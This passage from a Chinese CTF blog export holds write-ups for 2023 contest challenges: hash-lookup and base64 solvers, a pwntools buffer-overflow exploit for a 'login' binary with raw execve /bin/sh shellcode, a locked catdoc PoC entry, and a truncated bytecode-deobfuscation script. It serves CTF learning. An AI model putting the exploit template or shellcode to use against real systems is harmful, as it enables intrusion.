class="hljs-built_in">print</span>(den_text)</span><br></pre></td></tr></tbody></table></figure><h2 id="csgo"><a href="#csgo" class="headerlink" title="csgo"></a>csgo</h2><p>换表base64</p><p><img src="/2023/09/03/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-wp/res.jpeg"></p><h2 id="blast"><a href="#blast" class="headerlink" title="blast"></a>blast</h2><p>两次md5，用所有可见字符打一个hash表，然后查表</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">table = string.printable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hash</span>(<span class="hljs-params">x</span>):</span></span><br><span class="line">    m = md5()</span><br><span class="line">    m.update(x.encode())</span><br><span class="line">    <span class="hljs-keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">maps = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x:<span class="hljs-built_in">hash</span>(<span class="hljs-built_in">hash</span>(x)), table))</span><br><span class="line"><span class="hljs-comment"># print(maps)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># print(hash(hash('H')))</span></span><br><span class="line">flag = [<span class="hljs-string">'14d89c38cd0fb23a14be2798d449c182'</span>,</span><br><span class="line">        <span class="hljs-string">'a94837b18f8f43f29448b40a6e7386ba'</span>,</span><br><span class="line">        <span class="hljs-string">'af85d512594fc84a5c65ec9970956ea5'</span>,</span><br><span class="line">        <span class="hljs-string">'af85d512594fc84a5c65ec9970956ea5'</span>,</span><br><span class="line">        <span class="hljs-string">'10e21da237a4a1491e769df6f4c3b419'</span>,</span><br><span class="line">        <span class="hljs-string">'a705e8280082f93f07e3486636f3827a'</span>,</span><br><span class="line">        <span class="hljs-string">'297e7ca127d2eef674c119331fe30dff'</span>,</span><br><span class="line">        <span class="hljs-string">'b5d2099e49bdb07b8176dff5e23b3c14'</span>,</span><br><span class="line">        <span class="hljs-string">'83be264eb452fcf0a1c322f2c7cbf987'</span>,</span><br><span class="line">        <span class="hljs-string">'a94837b18f8f43f29448b40a6e7386ba'</span>,</span><br><span class="line">        <span class="hljs-string">'71b0438bf46aa26928c7f5a371d619e1'</span>,</span><br><span class="line">        <span class="hljs-string">'a705e8280082f93f07e3486636f3827a'</span>,</span><br><span class="line">        <span class="hljs-string">'ac49073a7165f41c57eb2c1806a7092e'</span>,</span><br><span class="line">        <span class="hljs-string">'a94837b18f8f43f29448b40a6e7386ba'</span>,</span><br><span class="line">        <span class="hljs-string">'af85d512594fc84a5c65ec9970956ea5'</span>,</span><br><span class="line">        <span class="hljs-string">'ed108f6919ebadc8e809f8b86ef40b05'</span>,</span><br><span class="line">        <span class="hljs-string">'10e21da237a4a1491e769df6f4c3b419'</span>,</span><br><span class="line">        <span class="hljs-string">'3cfd436919bc3107d68b912ee647f341'</span>,</span><br><span class="line">        <span class="hljs-string">'a705e8280082f93f07e3486636f3827a'</span>,</span><br><span class="line">        <span class="hljs-string">'65c162f7c43612ba1bdf4d0f2912bbc0'</span>,</span><br><span class="line">        <span class="hljs-string">'10e21da237a4a1491e769df6f4c3b419'</span>,</span><br><span class="line">        <span class="hljs-string">'a705e8280082f93f07e3486636f3827a'</span>,</span><br><span class="line">        <span class="hljs-string">'3cfd436919bc3107d68b912ee647f341'</span>,</span><br><span class="line">        <span class="hljs-string">'557460d317ae874c924e9be336a83cbe'</span>,</span><br><span class="line">        <span class="hljs-string">'a705e8280082f93f07e3486636f3827a'</span>,</span><br><span class="line">        <span class="hljs-string">'9203d8a26e241e63e4b35b3527440998'</span>,</span><br><span class="line">        <span class="hljs-string">'10e21da237a4a1491e769df6f4c3b419'</span>,</span><br><span class="line">        <span class="hljs-string">'f91b2663febba8a884487f7de5e1d249'</span>,</span><br><span class="line">        <span class="hljs-string">'a705e8280082f93f07e3486636f3827a'</span>,</span><br><span class="line">        <span class="hljs-string">'d7afde3e7059cd0a0fe09eec4b0008cd'</span>,</span><br><span class="line">        <span class="hljs-string">'488c428cd4a8d916deee7c1613c8b2fd'</span>,</span><br><span class="line">        <span class="hljs-string">'39abe4bca904bca5a11121955a2996bf'</span>,</span><br><span class="line">        <span class="hljs-string">'a705e8280082f93f07e3486636f3827a'</span>,</span><br><span class="line">        <span class="hljs-string">'3cfd436919bc3107d68b912ee647f341'</span>,</span><br><span class="line">        <span class="hljs-string">'39abe4bca904bca5a11121955a2996bf'</span>,</span><br><span class="line">        <span class="hljs-string">'4e44f1ac85cd60e3caa56bfd4afb675e'</span>,</span><br><span class="line">        <span class="hljs-string">'45cf8ddfae1d78741d8f1c622689e4af'</span>,</span><br><span class="line">        <span class="hljs-string">'3cfd436919bc3107d68b912ee647f341'</span>,</span><br><span class="line">        <span class="hljs-string">'39abe4bca904bca5a11121955a2996bf'</span>,</span><br><span class="line">        <span class="hljs-string">'4e44f1ac85cd60e3caa56bfd4afb675e'</span>,</span><br><span class="line">        <span class="hljs-string">'37327bb06c83cb29cefde1963ea588aa'</span>,</span><br><span class="line">        <span class="hljs-string">'a705e8280082f93f07e3486636f3827a'</span>,</span><br><span class="line">        <span class="hljs-string">'23e65a679105b85c5dc7034fded4fb5f'</span>,</span><br><span class="line">        <span class="hljs-string">'10e21da237a4a1491e769df6f4c3b419'</span>,</span><br><span class="line">        <span class="hljs-string">'71b0438bf46aa26928c7f5a371d619e1'</span>,</span><br><span class="line">        <span class="hljs-string">'af85d512594fc84a5c65ec9970956ea5'</span>,</span><br><span class="line">        <span class="hljs-string">'39abe4bca904bca5a11121955a2996bf'</span>]</span><br><span class="line"></span><br><span class="line">f=<span class="hljs-string">""</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:</span><br><span class="line">    f+=table[maps.index(i)]</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(f)</span><br></pre></td></tr></tbody></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>长度被截断为byte，输入长度0x100绕过，修改返回地址为后门，后门中对sh和flag进行了过滤，不需要拿shell所以直接通配符匹配flag就行，不过直接使用<code>$0</code>也可以执行sh。</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># %%</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="hljs-string">"./pwn_patched"</span>)</span><br><span class="line">libc = ELF(<span class="hljs-string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># context.binary = exe</span></span><br><span class="line">context.os = <span class="hljs-string">'linux'</span></span><br><span class="line"><span class="hljs-comment"># context.arch = context.binary.arch</span></span><br><span class="line"><span class="hljs-comment"># context.terminal = ['alacritty', '-e']</span></span><br><span class="line">context.terminal = [<span class="hljs-string">'wt.exe'</span>, <span class="hljs-string">'wsl'</span>, <span class="hljs-string">'--'</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="hljs-literal">False</span></span><br><span class="line"><span class="hljs-keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="hljs-string">'debug'</span></span><br><span class="line">    p = process([exe.path])</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    p = remote(<span class="hljs-string">"tcp.cloud.dasctf.com"</span>,xxxx)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbgaddr</span>(<span class="hljs-params">addr, PIE=<span class="hljs-literal">False</span></span>):</span>  <span class="hljs-comment"># PIE enabled</span></span><br><span class="line">    <span class="hljs-keyword">if</span> local:</span><br><span class="line">        <span class="hljs-keyword">if</span> PIE:</span><br><span class="line">            text_base = <span class="hljs-built_in">int</span>(</span><br><span class="line">                os.popen(<span class="hljs-string">"pmap {}| awk '{{print $1}}'"</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)</span><br><span class="line">            log.info(<span class="hljs-string">f'b *<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(text_base + addr)}</span>\n'</span>)</span><br><span class="line">            gdb.attach(p, <span class="hljs-string">f'b *<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(text_base + addr)}</span>'</span>)</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            gdb.attach(p, <span class="hljs-string">f'b *<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(addr)}</span>'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span>(<span class="hljs-params">func=<span class="hljs-string">''</span></span>):</span></span><br><span class="line">    <span class="hljs-keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, func)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main_arena</span>():</span></span><br><span class="line">    <span class="hljs-comment"># from ptrlib</span></span><br><span class="line">    ofs_stdin = libc.sym._IO_2_1_stdin_</span><br><span class="line">    ofs_realloc_hook = libc.sym.__realloc_hook</span><br><span class="line">    ofs_malloc_hook = libc.sym.__malloc_hook</span><br><span class="line">    <span class="hljs-keyword">if</span> ofs_realloc_hook <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> \</span><br><span class="line">       <span class="hljs-keyword">or</span> ofs_malloc_hook <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> \</span><br><span class="line">       <span class="hljs-keyword">or</span> ofs_stdin <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt; ofs_malloc_hook - ofs_stdin &lt; <span class="hljs-number">0x1000</span>:</span><br><span class="line">        <span class="hljs-comment"># libc-2.33 or older</span></span><br><span class="line">        <span class="hljs-keyword">if</span> context.bits == <span class="hljs-number">32</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> ofs_malloc_hook + <span class="hljs-number">0x18</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> ofs_malloc_hook + (ofs_malloc_hook - ofs_realloc_hook)*<span class="hljs-number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-comment"># libc-2.34 removed hooks</span></span><br><span class="line">        ofs_tzname = libc.sym.tzname</span><br><span class="line">        <span class="hljs-keyword">if</span> ofs_tzname <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br><span class="line">        <span class="hljs-keyword">if</span> context.bits == <span class="hljs-number">32</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> ofs_tzname - <span class="hljs-number">0x460</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> ofs_tzname - <span class="hljs-number">0x8a0</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ROL</span>(<span class="hljs-params">content, key</span>):</span></span><br><span class="line">    <span class="hljs-comment"># house of emma</span></span><br><span class="line">    <span class="hljs-comment"># ROL(gadget_addr ^ fake_pointer_guard, 0x11)</span></span><br><span class="line">    tmp = <span class="hljs-built_in">bin</span>(content)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">64</span>, <span class="hljs-string">'0'</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(tmp[key:] + tmp[:key], <span class="hljs-number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># dbgaddr(0xdeadbeef,PIE=False)</span></span><br><span class="line"><span class="hljs-comment"># dbg("main")</span></span><br><span class="line"></span><br><span class="line">s = <span class="hljs-keyword">lambda</span> <span class="hljs-built_in">str</span>: p.send(<span class="hljs-built_in">str</span>)</span><br><span class="line">sl = <span class="hljs-keyword">lambda</span> <span class="hljs-built_in">str</span>: p.sendline(<span class="hljs-built_in">str</span>)</span><br><span class="line">sa = <span class="hljs-keyword">lambda</span> delims, <span class="hljs-built_in">str</span>: p.sendafter(delims, <span class="hljs-built_in">str</span>)</span><br><span class="line">sla = <span class="hljs-keyword">lambda</span> delims, <span class="hljs-built_in">str</span>: p.sendlineafter(delims, <span class="hljs-built_in">str</span>)</span><br><span class="line">r = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>: p.recv(numb)</span><br><span class="line">rl = <span class="hljs-keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>: p.recvuntil(delims, drop)</span><br><span class="line">uu32 = <span class="hljs-keyword">lambda</span> data: u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b'\x00'</span>))</span><br><span class="line">uu64 = <span class="hljs-keyword">lambda</span> data: u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b'\x00'</span>))</span><br><span class="line">li = <span class="hljs-keyword">lambda</span> <span class="hljs-built_in">str</span>, data: log.success(<span class="hljs-built_in">str</span> + <span class="hljs-string">'========&gt;'</span> + <span class="hljs-built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># https://www.exploit-db.com/shellcodes</span></span><br><span class="line">execve_bin_sh = <span class="hljs-string">b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></span><br><span class="line">execveat_bin_sh = <span class="hljs-string">b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"</span></span><br><span class="line">cat_flag = <span class="hljs-string">b"\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x67\x6d\x60\x66\x01\x01\x01\x48\x31\x04\x24\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"</span></span><br><span class="line">ls_current_dir = <span class="hljs-string">b"\x68\x2f\x2e\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\x89\xe7\x31\xd2\xbe\x01\x01\x02\x01\x81\xf6\x01\x01\x03\x01\x6a\x02\x58\x0f\x05\x48\x89\xc7\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x4e\x58\x0f\x05\x6a\x01\x5f\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x01\x58\x0f\x05"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># %%</span></span><br><span class="line">back=<span class="hljs-number">0x123456ee</span></span><br><span class="line">sla(<span class="hljs-string">"name:"</span>,<span class="hljs-string">b"aaa"</span>)</span><br><span class="line">sa(<span class="hljs-string">"words"</span>,<span class="hljs-string">b"a"</span>*<span class="hljs-number">256</span>+p32(back)+<span class="hljs-string">b"\x00"</span>)</span><br><span class="line">sa(<span class="hljs-string">"exec"</span>,<span class="hljs-string">"cat f*\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># %%</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>catdoc 0.95 nullptr dereference</title>
      <link href="/2023/08/29/catdoc-0-95-nullptr-dereference/"/>
      <url>/2023/08/29/catdoc-0-95-nullptr-dereference/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="42ea245a97daefed14307f5166da46e771a1beafb45c9f1b171fd9c353ddcb6c"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码查看文章</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> pocs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wmctf-2023</title>
      <link href="/2023/08/22/wmctf-2023/"/>
      <url>/2023/08/22/wmctf-2023/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>只做了一天，有很多新东西，后面慢慢复现</p><span id="more"></span><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="rightback"><a href="#rightback" class="headerlink" title="rightback"></a>rightback</h2><p>去花</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> marshal</span><br><span class="line"><span class="hljs-keyword">import</span> dis</span><br><span class="line"><span class="hljs-keyword">import</span> struct</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line"><span class="hljs-keyword">import</span> types</span><br><span class="line"><span class="hljs-keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_metadata</span>(<span class="hljs-params">fp</span>):</span></span><br><span class="line">    magic = struct.unpack(<span class="hljs-string">'&lt;l'</span>, fp.read(<span class="hljs-number">4</span>))[<span class="hljs-number">0</span>]</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"magic number = <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(magic)}</span>"</span>)</span><br><span class="line">    bit_field = struct.unpack(<span class="hljs-string">'&lt;l'</span>, fp.read(<span class="hljs-number">4</span>))[<span class="hljs-number">0</span>]</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"bit filed = <span class="hljs-subst">{bit_field}</span>"</span>)</span><br><span class="line">    t = struct.unpack(<span class="hljs-string">'&lt;l'</span>, fp.read(<span class="hljs-number">4</span>))[<span class="hljs-number">0</span>]</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"time = <span class="hljs-subst">{time.asctime(time.localtime(t))}</span>"</span>)</span><br><span class="line">    file_size = struct.unpack(<span class="hljs-string">'&lt;l'</span>, fp.read(<span class="hljs-number">4</span>))[<span class="hljs-number">0</span>]</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"file size = <span class="hljs-subst">{file_size}</span>"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_code</span>(<span class="hljs-params">code, indent=<span class="hljs-string">''</span></span>):</span></span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"%scode"</span> % indent)</span><br><span class="line">    indent += <span class="hljs-string">'   '</span></span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"%sargcount %d"</span> % (indent, code.co_argcount))</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"%snlocals %d"</span> % (indent, code.co_nlocals))</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"%sstacksize %d"</span> % (indent, code.co_stacksize))</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"%sflags %04x"</span> % (indent, code.co_flags))</span><br><span class="line">    show_hex(<span class="hljs-string">"code"</span>, code.co_code, indent=indent)</span><br><span class="line">    co = <span class="hljs-built_in">bytearray</span>(code.co_code)</span><br><span class="line">    extended_arg = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(co), <span class="hljs-number">2</span>):</span><br><span class="line">        op = co[i]</span><br><span class="line">        <span class="hljs-keyword">if</span> op &gt;= <span class="hljs-number">90</span>:</span><br><span class="line">            arg = co[i+<span class="hljs-number">1</span>] | extended_arg</span><br><span class="line">            extended_arg = (arg &lt;&lt; <span class="hljs-number">8</span>) <span class="hljs-keyword">if</span> op == <span class="hljs-number">114</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span></span><br><span class="line">            <span class="hljs-keyword">if</span> co[i] == <span class="hljs-number">110</span>:</span><br><span class="line">                <span class="hljs-comment"># print("=========&gt; ", co[i+1])</span></span><br><span class="line">                <span class="hljs-keyword">if</span> arg &lt; <span class="hljs-number">5</span>:</span><br><span class="line">                    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, i+arg+<span class="hljs-number">2</span>):</span><br><span class="line">                        co[j] = <span class="hljs-number">9</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            arg = <span class="hljs-literal">None</span></span><br><span class="line">            extended_arg = <span class="hljs-number">0</span></span><br><span class="line">    mode = types.CodeType(code.co_argcount, 